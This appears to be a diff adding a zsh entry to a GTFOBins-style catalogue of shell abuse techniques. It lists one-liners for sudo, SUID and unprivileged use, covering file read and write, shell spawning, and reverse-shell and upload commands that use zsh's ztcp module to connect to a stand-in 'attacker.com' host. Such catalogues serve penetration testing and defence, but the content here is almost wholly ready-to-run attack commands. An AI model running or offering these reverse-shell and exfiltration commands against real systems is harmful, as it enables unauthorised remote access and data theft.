@@ -1,0 +1,98 @@
+zsh
+===
+
+Download
+--------
+
+[Sudo]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+
+[SUID]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+
+[Unprivileged]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+
+File read
+---------
+
+[Sudo]
+    zsh -c 'echo "$(</path/to/input-file)"'
+
+[SUID]
+    zsh -c 'echo "$(</path/to/input-file)"'
+
+[Unprivileged]
+    zsh -c 'echo "$(</path/to/input-file)"'
+
+[Sudo]
+    zsh -c '</path/to/input-file'
+    This spawns a pager if run in a TTY.
+
+[SUID]
+    zsh -c '</path/to/input-file'
+    This spawns a pager if run in a TTY.
+
+[Unprivileged]
+    zsh -c '</path/to/input-file'
+    This spawns a pager if run in a TTY.
+
+File write
+----------
+
+[Sudo]
+    zsh -c 'echo DATA >/path/to/output-file'
+
+[SUID]
+    zsh -c 'echo DATA >/path/to/output-file'
+
+[Unprivileged]
+    zsh -c 'echo DATA >/path/to/output-file'
+
+Inherit
+-------
+
+[Sudo]
+    zsh -c '</etc/hosts'
+
+[SUID]
+    zsh -c '</etc/hosts'
+
+[Unprivileged]
+    zsh -c '</etc/hosts'
+
+Reverse shell
+-------------
+
+[Sudo]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+[SUID]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+[Unprivileged]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+Shell
+-----
+
+[Sudo]
+    zsh
+
+[SUID]
+    zsh
+
+[Unprivileged]
+    zsh
+
+Upload
+------
+
+[Sudo]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
+
+[SUID]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
+
+[Unprivileged]
+    zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
